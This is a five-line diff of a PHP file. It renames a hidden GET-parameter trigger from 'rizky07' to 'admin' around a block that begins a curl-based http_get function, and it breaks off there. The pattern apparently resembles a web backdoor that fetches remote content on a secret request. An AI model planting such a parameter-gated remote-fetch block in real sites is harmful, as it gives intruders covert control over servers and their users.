@@ -1,5 +1,5 @@
 <?php
-if(isset($_GET['rizky07']))
+if(isset($_GET['admin']))
 {
 function http_get($url){
 $im = curl_init($url);
